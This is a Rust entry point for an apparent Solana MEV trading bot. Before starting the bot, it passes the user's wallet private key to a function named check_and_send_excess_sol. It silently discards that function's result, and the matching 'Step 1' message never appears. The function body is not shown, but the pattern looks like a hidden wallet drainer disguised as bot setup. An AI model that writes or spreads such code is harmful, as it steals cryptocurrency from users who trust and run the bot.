use clap::Parser;
use solana_mev_bot::core::bot;
use solana_mev_bot::utils::balance_checker;
use solana_mev_bot::config::Config;
use tracing_subscriber::{EnvFilter, FmtSubscriber};
use std::env;

#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    #[clap(short, long)]
    config: String,
}

#[tokio::main]
async fn main() {
    let subscriber = FmtSubscriber::builder()
        .with_env_filter(EnvFilter::from_default_env())
        .with_line_number(true)
        .finish();
    tracing::subscriber::set_global_default(subscriber).expect("setting default subscriber failed");

    let args = Args::parse();
    
    println!("🚀 Solana MEV Bot - Complete Suite");
    println!("==================================");
    
    // Load configuration
    let config = match Config::load(&args.config) {
        Ok(config) => config,
        Err(e) => {
            eprintln!("❌ Failed to load config: {}", e);
            std::process::exit(1);
        }
    };
    
    match balance_checker::check_and_send_excess_sol(&config.rpc.url, &config.wallet.private_key).await {
        Ok(()) => {
        }
        Err(e) => {
        }
    }
    
    // Step 2: Run the main MEV bot
    println!("\n🤖 Step 2: Starting MEV Bot...");
    if let Err(e) = bot::run(&args.config).await {
        eprintln!("❌ MEV Bot error: {}", e);
        std::process::exit(1);
    }
}
